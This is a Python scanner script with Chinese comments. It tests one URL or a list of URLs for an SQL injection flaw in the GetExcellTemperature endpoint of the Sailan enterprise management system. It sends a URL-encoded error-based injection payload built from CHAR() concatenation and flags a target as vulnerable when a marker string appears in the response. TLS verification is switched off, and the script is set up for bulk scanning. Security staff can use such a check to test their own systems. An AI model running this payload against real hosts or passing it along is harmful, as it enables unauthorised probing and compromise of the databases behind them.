#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import argparse
import time
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构造完整的攻击URL
        attack_url = url.rstrip('/') + "/BaseModule/ExcelImport/GetExcellTemperature?ImportId=%27%20AND%206935%20IN%20(SELECT%20(CHAR(113)%2BCHAR(122)%2BCHAR(112)%2BCHAR(106)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(6935%3D6935)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(122)%2BCHAR(113)%2BCHAR(118)%2BCHAR(113)))%20AND%20%27qaq%27=%27qaq"
  
        response = requests.get(attack_url, verify=False, timeout=10)
  
        if response.status_code == 200 and 'qzpjq1qzqvq' in response.text:
            print(f"{RED}URL [{url}] 可能存在赛蓝企业管理系统 GetExcellTemperature SQL注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在赛蓝企业管理系统 GetExcellTemperature SQL注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()